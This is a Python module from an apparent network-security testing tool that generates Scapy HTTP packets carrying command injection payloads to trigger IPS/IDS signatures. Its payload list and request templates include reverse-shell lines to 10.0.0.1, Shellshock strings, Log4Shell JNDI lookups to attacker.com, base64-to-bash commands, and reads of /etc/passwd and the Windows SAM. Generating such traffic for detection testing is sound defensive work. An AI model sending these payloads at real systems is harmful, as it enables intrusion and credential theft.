"""Command Injection pattern traffic module."""

from collections.abc import Iterator

from scapy.layers.inet import IP, TCP
from scapy.packet import Packet, Raw

from netsec_tester.modules.base import ModuleInfo, TrafficCategory, TrafficModule

# Command injection payloads that trigger IPS signatures
COMMAND_INJECTION_PAYLOADS = [
    # Basic command chaining
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "|| cat /etc/passwd",
    "&& cat /etc/passwd",
    "& cat /etc/passwd",
    "`cat /etc/passwd`",
    "$(cat /etc/passwd)",
    # Command substitution
    "; id",
    "| id",
    "; whoami",
    "| whoami",
    "; uname -a",
    "`id`",
    "$(id)",
    # Windows commands
    "& dir",
    "| dir",
    "& type C:\\Windows\\System32\\config\\SAM",
    "| net user",
    "& net localgroup administrators",
    # Reverse shell attempts (patterns only)
    "; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "; nc -e /bin/sh 10.0.0.1 4444",
    "; python -c 'import socket,subprocess,os'",
    "; perl -e 'use Socket'",
    # Shellshock (CVE-2014-6271)
    "() { :; }; /bin/bash -c 'cat /etc/passwd'",
    "() { :;}; /bin/bash -c 'id'",
    "() { ignored; }; /bin/bash -c 'whoami'",
    # Log4Shell (CVE-2021-44228) patterns
    "${jndi:ldap://attacker.com/a}",
    "${jndi:rmi://attacker.com/a}",
    "${jndi:dns://attacker.com/a}",
    "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://attacker.com/a}",
    "${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/a}",
    # Newline injection
    "%0a cat /etc/passwd",
    "%0d%0a cat /etc/passwd",
    "\\n cat /etc/passwd",
    # Encoded commands
    ";Y2F0IC9ldGMvcGFzc3dk|base64 -d|bash",
    ";echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh",
    # Argument injection
    "--help; id",
    "-version; whoami",
    "-exec /bin/sh",
]


class CommandInjectionModule(TrafficModule):
    """Traffic module for Command Injection attack patterns.

    Generates HTTP requests containing command injection payloads
    to trigger IPS/IDS signatures.
    """

    def __init__(self) -> None:
        """Initialize the command injection module."""
        self._payload_index = 0

    def get_info(self) -> ModuleInfo:
        """Return module information."""
        return ModuleInfo(
            name="command_injection",
            description="OS Command injection patterns for IPS/IDS testing",
            category=TrafficCategory.IPS_IDS,
            protocols=["TCP", "HTTP"],
            ports=[80, 443, 8080, 8443],
        )

    def generate_packets(
        self,
        src_ip: str,
        dst_ip: str,
        dst_port: int | None = None,
    ) -> Iterator[Packet]:
        """Generate command injection packets.

        Args:
            src_ip: Source IP address
            dst_ip: Destination IP address
            dst_port: Destination port

        Yields:
            Scapy packets with command injection payloads
        """
        port = dst_port or 80

        # Get next payload
        payload = COMMAND_INJECTION_PAYLOADS[self._payload_index % len(COMMAND_INJECTION_PAYLOADS)]
        self._payload_index += 1

        import urllib.parse

        encoded_payload = urllib.parse.quote(payload)

        # HTTP GET with command injection in parameter
        http_get = (
            f"GET /cgi-bin/ping.cgi?ip=127.0.0.1{encoded_payload} HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"User-Agent: () {{ :; }}; /bin/bash -c 'id'\r\n"
            f"Accept: */*\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=40000 + (self._payload_index % 25000), dport=port, flags="PA")
            / Raw(load=http_get.encode())
        )

        yield packet

        # HTTP POST with command injection
        post_body = f"cmd=ping&target=127.0.0.1{payload}"
        http_post = (
            f"POST /api/execute HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(post_body)}\r\n"
            f"X-Api-Version: ${{jndi:ldap://attacker.com/a}}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
            f"{post_body}"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=40000 + (self._payload_index % 25000), dport=port, flags="PA")
            / Raw(load=http_post.encode())
        )

        yield packet
